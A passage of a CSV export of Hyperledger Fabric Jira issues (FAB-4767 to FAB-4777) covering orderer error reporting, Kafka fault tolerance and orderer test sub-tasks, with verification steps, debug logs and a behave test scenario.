doesn't need to contain the error variable, since it's nil.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy327:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jun/17 12:34 AM;C0rWin;https://gerrit.hyperledger.org/r/#/c/10641/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Could Broadcast  return more fine grained errors than BAD_STATUS?,FAB-4767,18070,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,jyellick,Nishi,Nishi,16/Jun/17 1:50 AM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,11/Aug/17 9:58 AM,v1.0.0-beta,,,v1.1.0,,fabric-orderer,fabric-quality,,,,,0,common-components,Release-planning-1.1,sdk,,,,"To reproduce and verify please refer to :

https://jira.hyperledger.org/browse/FAB-4373",,kchristidis,Nishi,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,FABJ-275,,,,,,,,,,,FAB-4502,,,,,FAB-4373,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy32f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,kchristidis,Nishi,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/17 11:35 AM;kchristidis;Nishi, how does this relate to FAB-4583? Trying to cut down on the duplicates.;;;","17/Jun/17 2:40 AM;Nishi;Added FAB-4373, so that I can verify once this get fixed. Filed it as a generic for anywhere we might encounter ""BAD_STATUS"".

When verifying FAB-4373, I got a simple message saying ""BAD_STATUS"" expecting a more detailed message with why Request Failed to deliver.;;;","17/Jun/17 3:23 AM;kchristidis;I don't follow. I'm asking what the relationship to FAB-4583 is, cause it seems to me like there's some overlap.

Put it another way: if FAB-4767 is addressed, is FAB-4583 taken care of?

If it is, please close FAB-4583. If it's not, let's explain the differences.

Let's clarify this.

 ;;;","20/Jun/17 1:01 AM;Nishi;[~kchristidis] FAB-4583 is not related to ""BAD_STATUS"" issue. Commented on FAB-4583.;;;","10/Jul/17 9:04 PM;kchristidis;Just to be clear: the plan of attack here is adding a ""details"" (or whatever we want to call it) string field to the [BroadcastResponse proto definition|https://github.com/hyperledger/fabric/blob/master/protos/orderer/ab.proto#L26].;;;","12/Aug/17 12:26 AM;Nishi;Fabric commit level: *4388f48ea62907daa7906c78235fe1de73c87c1e*

Steps to verify -FAB-4767-
 =========================

1. Get latest master
 2. make clean docker-clean dist-clean
 3. make release docker
 4. cd fabric/examples/e2e_cli
 5. make sure e2e_cli runs ok by default successfully
 6. ./network_setup.sh up myc 
 7. cp scripts/script.sh scripts/script_original.sh
 8. edit script.sh
 9. In setGlobals function

comment where we pass admin certs
 #CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
 and instead pass user cert
 CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp

10. run e2e_cli now again
 ./network_setup.sh restart myc

11. Detailed error message displayed as follows while creating channel which required admin certs:
{code:java}
===================== Ordering Service is up and running ===================== 

Creating channel...
CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.key
CORE_PEER_LOCALMSPID=Org1MSP
CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock
CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.crt
CORE_PEER_TLS_ENABLED=true
CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp
CORE_PEER_ID=cli
CORE_LOGGING_LEVEL=DEBUG
CORE_PEER_ADDRESS=peer0.org1.example.com:7051
2017-08-11 14:51:15.940 UTC [msp] GetLocalMSP -> DEBU 001 Returning existing local MSP
2017-08-11 14:51:15.940 UTC [msp] GetDefaultSigningIdentity -> DEBU 002 Obtaining default signing identity
2017-08-11 14:51:15.943 UTC [channelCmd] InitCmdFactory -> INFO 003 Endorser and orderer connections initialized
2017-08-11 14:51:15.944 UTC [msp] GetLocalMSP -> DEBU 004 Returning existing local MSP
2017-08-11 14:51:15.944 UTC [msp] GetDefaultSigningIdentity -> DEBU 005 Obtaining default signing identity
2017-08-11 14:51:15.944 UTC [msp] GetLocalMSP -> DEBU 006 Returning existing local MSP
2017-08-11 14:51:15.944 UTC [msp] GetDefaultSigningIdentity -> DEBU 007 Obtaining default signing identity
2017-08-11 14:51:15.944 UTC [msp/identity] Sign -> DEBU 008 Sign: plaintext: 0A88060A074F7267314D535012FC052D...53616D706C65436F6E736F727469756D 
2017-08-11 14:51:15.944 UTC [msp/identity] Sign -> DEBU 009 Sign: digest: EC500E800BF822D0195C98A92D361F9A92E1D09472E2776A699C2BB10AF63802 
2017-08-11 14:51:15.944 UTC [msp] GetLocalMSP -> DEBU 00a Returning existing local MSP
2017-08-11 14:51:15.944 UTC [msp] GetDefaultSigningIdentity -> DEBU 00b Obtaining default signing identity
2017-08-11 14:51:15.944 UTC [msp] GetLocalMSP -> DEBU 00c Returning existing local MSP
2017-08-11 14:51:15.944 UTC [msp] GetDefaultSigningIdentity -> DEBU 00d Obtaining default signing identity
2017-08-11 14:51:15.944 UTC [msp/identity] Sign -> DEBU 00e Sign: plaintext: 0AB9060A0F08021A0608E388B7CC0522...8AED28E5C0B63525E78A79D39FCCC751 
2017-08-11 14:51:15.944 UTC [msp/identity] Sign -> DEBU 00f Sign: digest: BE22C2C90837236F160CC16FCEE1321F444C4C71A2959B621AF0977CEC76D14D 

{code}
Error: Got unexpected status: BAD_REQUEST – Error authorizing update: Error validating DeltaSet: Policy for [Groups] /Channel/Application not satisfied: Failed to reach implicit threshold of 1 sub-policies, required 1 remaining
 Usage:
 peer channel create [flags]
{code:java}
Flags:
  -c, --channelID string   In case of a newChain command, the channel ID to create.
  -f, --file string        Configuration transaction file generated by a tool such as configtxgen for submitting to orderer
  -t, --timeout int        Channel creation timeout (default 5)

Global Flags:
      --cafile string                       Path to file containing PEM-encoded trusted certificate(s) for the ordering endpoint
      --logging-level string                Default logging level and overrides, see core.yaml for full syntax
  -o, --orderer string                      Ordering service endpoint
      --ordererTLSHostnameOverride string   The hostname override to use when validating the TLS connection to the orderer.
      --test.coverprofile string            Done (default ""coverage.cov"")
      --tls                                 Use TLS when communicating with the orderer endpoint
  -v, --version                             Display current version of fabric peer server

!!!!!!!!!!!!!!! Channel creation failed !!!!!!!!!!!!!!!!
================== ERROR !!! FAILED to execute End-2-End Scenario ==================
{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix asymmetry in fault tolerance of deliver component (versus the broadcast one),FAB-4768,18071,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sanchezl,kchristidis,kchristidis,16/Jun/17 2:30 AM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,02/Oct/17 11:55 PM,v1.0.0-beta,,,v1.1.0,,fabric-orderer,,,,,,0,kafka,Release-planning-1.1,,,,,"The high-level overview:
 * When we issue a Broadcast RPC, the Producer component of the orderer retries a few times before returning a SERVICE_UNAVAILABLE response code.
 * When we issue a Deliver RPC, the Consumer component of the orderer will return a SERVICE_UNAVAILABLE response code (and close the client connection) right away, at the slightest indication of error.

For example, if the leader broker of a channel goes down and a new leader _is available right away_, we will error (because Kafka returns an error in this case) and drop the connection. (The client can issue a new Deliver RPC almost instantaneously and it will be served. Reacting to the leader change and connecting to the different leader is a process that at most takes a second or two.)

In this exact scenario, it's highly like that Broadcast RPC would go through just fine (even if a leader change happens halfway through), because the retries outlast the ""leader change / connect to the different leader"" process.

Possible solutions:
 # Have the Consumer attempt to send a CONNECT message with a very short retry period before closing the error channel (and dropping the connected Deliver clients). This is not suggested because it couples the consumer with the producer. They can fail in different ways.
 # Examine the incoming error and if it's a leadership change message, increment a counter, `continue` in the for-loop, and only close the error channel if the counter exceeds a threshold. This might be slightly trickier than it sounds.
 # As [~jyellick] suggested: Solve this from the `deliver` package side, i.e. don't pull the trigger on returning SERVICE_UNAVAILABLE right away. Might be the most straightforward way of going at it. The only thing that makes me skeptical here is that we're fixing package X to address a concern that stems from package Y.",,kchristidis,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy32n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,kchristidis,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jul/17 11:13 AM;kchristidis;My vote here is for solution #2 or a variation/refinement of it.;;;","12/Aug/17 3:56 AM;kchristidis;(Just a heads up that if we have to prioritize for the 1.1 cutoff, FAB-5284 and FAB-5720 should take priority.);;;","27/Aug/17 9:54 AM;sanchezl;The solution I went with in the proposed patch set ([12629|https://gerrit.hyperledger.org/r/12629]) will only close the error channel if an *OffsetOutOfRange* error occurs.
 * A Deliver stream will only stop and return *SERVICE_UNAVAILABLE* only if an *OffsetOutOfRange* error occurs.
 * Otherwise, a Deliver stream will remain open indefinitely, even while the channel (kafka topic partition) or the kafka cluster itself is degraded. This allows Deliver clients to automatically resume receiving block after the Kafka issues have been resolved.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test taking down all kafka brokers and bringing back first 2,FAB-4769,18073,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,scottz,scottz,16/Jun/17 3:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Oct/17 3:09 AM,v1.0.0,,,DUPLICATE,v1.0.0,fabric-quality,,,,,,0,orderer,quality,,,,,"* +Test Name+: Test taking down all kafka brokers and bringing back first 2, then try again
 * +Component+:  Orderer
 * +Description+: Test taking down all kafka brokers and bringing back only 2 brokers. The 2 last broker that went down should stay down. This should test a subset of the functionality submitted with -FAB-890-
 * +Artifact Locations+:  test/feature/orderer.feature
 * +Network Topology+:  3 kafka-based orderers, 3 zookeepers, 4 kafka brokers, 2 Orgs, 2 peers per org (4 peers total)
 * +Client Driver+:  behave
 * +Input+:  behave -n ""FAB-4769""
 * +Output+: 1 scenario passed, 0 failed ",,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy32v:",,,,,,,,,,,,,,,,,,,,,,,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jun/17 4:27 AM;latitiah;https://gerrit.hyperledger.org/r/11029;;;","29/Jun/17 9:39 AM;latitiah;After multiple discussions, it is determined that this is not a valid testcase. This scenario as stated can have differing results.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"All kafka brokers in RF Set go down: stop 0,1,2; start 2,1,0. At each step, Invokes good unless fewer than min_isr KBs available",FAB-4770,18074,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,scottz,scottz,16/Jun/17 3:12 AM,21/Dec/18 5:10 AM,28/Oct/23 3:00 AM,09/Sep/17 4:59 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* +Test Name+: Test taking down all kafka brokers and bringing back first 3
 * +Component+:  Orderer
 * +Description+: Test taking down all kafka brokers and bringing back in LIFO order. This should test a subset of the functionality submitted with -FAB-890-
 * +Artifact Locations+:  test/feature/orderer.feature
 * +Network Topology+:  3 kafka-based orderers, 3 zookeepers, 4 kafka brokers, 2 Orgs, 2 peers per org (4 peers total)
 * +Client Driver+:  behave
 * +Input+:  behave -n ""-FAB-4770-""
 * +Output+: 1 scenario passed, 0 failed 

 ",,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy333:",,,,,,,,,,,,,,,,,,,,,,,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,true,"29/Jun/17 9:40 AM;latitiah;{code}
Scenario: FAB-4770: Test taking down all kafka brokers and bringing back last 3, in same order
  Given I have a bootstrapped fabric network of type kafka
  And I wait ""60"" seconds
  When a user deploys chaincode at path ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02"" with [""init"",""a"",""1000"",""b"",""2000""] with name ""mycc""
  And I wait ""5"" seconds
  Then the chaincode is deployed
  When a user invokes on the chaincode named ""mycc"" with args [""invoke"",""a"",""b"",""10""]
  And I wait ""5"" seconds
  And a user queries on the chaincode named ""mycc"" with args [""query"",""a""]
  Then a user receives successful response of 990

  Given ""kafka0"" is taken down
  And I wait ""5"" seconds
  When a user invokes on the chaincode named ""mycc"" with args [""invoke"",""a"",""b"",""10""]
  And I wait ""5"" seconds
  When a user queries on the chaincode with args [""query"",""a""]
  Then a user receives successful response of 980

  Given ""kafka1"" is taken down
  And ""kafka2"" is taken down
  And ""kafka3"" is taken down
  And I wait ""5"" seconds
  When a user invokes on the chaincode named ""mycc"" with args [""invoke"",""a"",""b"",""10""]
  And I wait ""5"" seconds
  And a user queries on the chaincode named ""mycc"" with args [""query"",""a""]
  Then a user receives successful response of 980

  And I wait ""5"" seconds
  Given ""kafka1"" comes back up
  And ""kafka2"" comes back up
  And ""kafka3"" comes back up
  And I wait ""240"" seconds
  When a user invokes on the chaincode named ""mycc"" with args [""invoke"",""a"",""b"",""10""]
  And I wait ""300"" seconds
  When a user queries on the chaincode named ""mycc"" with args [""query"",""a""]
  Then a user receives successful response of 970
{code}
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"new partition leader takes over when first one stopped, query to verify config settings",FAB-4771,18075,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 3:13 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* +Test Name+: Test the manipulation of the partition leaders among kafka brokers 
 * +Component+:  Orderer
 * +Description+: Test stopping and pausing kafka brokers ensuring that as the topic leader rotates through each kafka broker that the network continues to operate as expected. The rotation can be forced by stopping and starting brokers as needed. Then verify that a new broker is the leader. This should test a subset of the functionality submitted with -FAB-890-
 * +Artifact Locations+:  test/feature/orderer.feature
 * +Network Topology+:  3 kafka-based orderers, 3 zookeepers, 4 kafka brokers, 2 Orgs, 2 peers per org (4 peers total)
 * +Client Driver+:  behave
 * +Input+:  behave -n ""FAB-4771""
 * +Output+: 1 scenario passed, 0 failed 

 ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy33b:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
multichannels test - creation of per-session buffered channel for broadcast responses,FAB-4772,18077,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 3:24 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Jun/17 5:04 AM,v1.0.0,,,DUPLICATE,,fabric-quality,,,,,,0,orderer,quality,,,,,"* +Test Name+: Test ??
 * +Component+:  Orderer
 * +Description+: Test ?? This should test a subset of the functionality submitted with -FAB-839-
 * +Artifact Locations+:  test/feature/orderer.feature
 * +Network Topology+:  3 kafka-based orderers, 3 zookeepers, 4 kafka brokers, 2 Orgs, 2 peers per org (4 peers total)
 * +Client Driver+:  behave
 * +Input+:  behave -n ""FAB-4772""
 * +Output+: 1 scenario passed, 0 failed 

 ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy33j:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Config info for new channel creation turns into block,FAB-4773,18078,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,scottz,scottz,16/Jun/17 3:27 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,13/Feb/18 3:51 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* +Test Name+: Config info for channel creation turns into channel block
 * +Component+:  Bootstrap
 * +Description+: Test the channel block should contain at least read and write sets with MSP data, policy data, orgs, ACL data. This should test a subset of the functionality submitted with --FAB-998--
 * +Artifact Locations+:  test/feature/orderer.feature
 * +Network Topology+:  3 kafka-based orderers, 3 zookeepers, 4 kafka brokers, 2 Orgs, 2 peers per org (4 peers total)
 * +Client Driver+:  behave
 * +Input+:  behave -n ""FAB-4773""
 * +Output+: 1 scenario passed, 0 failed 

 ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy33r:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Creating genesis block when setting up broadcaster,FAB-4774,18079,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 3:47 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Jun/17 5:08 AM,v1.0.0,,,DUPLICATE,,fabric-quality,,,,,,0,orderer,quality,,,,,"Test Name: <FAB_xxxx>_<Title>
Component: <use the Component column from the testplan>
Description: <test overview and objective> (tests the FAB-1161 somehow)
Artifact Locations: <location of test script and input files>
Network Topology: <number of nodes of each type; use ""standard"" for our standard docker-compose file that is being used for most tests>
Client Driver: <test tool>
Input: <command to run the test>
Output: <key portions of stdout of running the test, showing it passes>",,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy33z:",,,,,,,,,,,,,,,,,,,,,,,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/17 5:08 AM;latitiah;Dup of https://jira.hyperledger.org/browse/FAB-3854;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
test if a valid configuration envelope created by the orderer which then creates a genesis block,FAB-4775,18080,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 3:49 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Jun/17 5:07 AM,v1.0.0,,,DUPLICATE,,fabric-quality,,,,,,0,orderer,quality,,,,,"Test Name: <FAB_xxxx>_<Title>

Component: <use the Component column from the testplan>
Description: <test overview and objective> (tests the FAB-1092,FAB-1013 somehow)
Artifact Locations: <location of test script and input files>
Network Topology: <number of nodes of each type; use ""standard"" for our standard docker-compose file that is being used for most tests>
Client Driver: <test tool>
Input: <command to run the test>
Output: <key portions of stdout of running the test, showing it passes>",,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy347:",,,,,,,,,,,,,,,,,,,,,,,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/17 5:06 AM;latitiah;Dup of https://jira.hyperledger.org/browse/FAB-3635;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer node should be able to retrieve the genesis block and join the network of nodes,FAB-4776,18081,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,scottz,scottz,16/Jun/17 3:50 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,13/Feb/18 3:51 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"Test Name: <FAB_xxxx>_<Title>
Component: <use the Component column from the testplan>
Description: <test overview and objective> (tests the FAB-666 somehow)
Artifact Locations: <location of test script and input files>
Network Topology: <number of nodes of each type; use ""standard"" for our standard docker-compose file that is being used for most tests>
Client Driver: <test tool>
Input: <command to run the test>
Output: <key portions of stdout of running the test, showing it passes>",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy34f:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
All orderer nodes should recieve the genesis block,FAB-4777,18082,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,RichardHill,scottz,scottz,16/Jun/17 3:51 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Dec/17 8:25 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"Test Name: <FAB_xxxx>_<Title>
Component: <use the Component column from the testplan>
Description: <test overview and objective> (tests the FAB-666 somehow)
Artifact Locations: <location of test script and input files>
Network Topology: <number of nodes of each type; use ""standard"" for our standard docker-compose file that is being used for most tests>
Client Driver: <test tool>
Input: <command to run the test>
